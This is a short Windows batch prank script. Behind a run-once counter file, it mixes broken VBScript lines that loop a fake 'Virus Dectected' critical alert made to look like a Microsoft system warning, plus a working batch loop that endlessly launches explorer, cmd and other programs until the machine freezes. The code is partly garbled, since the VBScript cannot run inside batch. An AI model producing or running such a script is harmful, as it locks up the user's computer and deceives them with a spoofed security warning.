set number=1
< run.sav (
  set /p number=
)
:: ADD 1 TO UPDATE TO RUN THE CODE ::
set update=1
if %number% equ %update% (goto end)
:: PUT CODE IN HERE :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
do
x=MsgBox("Virus Dectected", vbOkOnly+vbCritical, "System32/Microsoft/")
loop
:x
start explorer
start cmd
start google
start 
goto x


:: END CODE HERE ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo %update% >run.sav
:end
timeout 1 >nul
exit /b
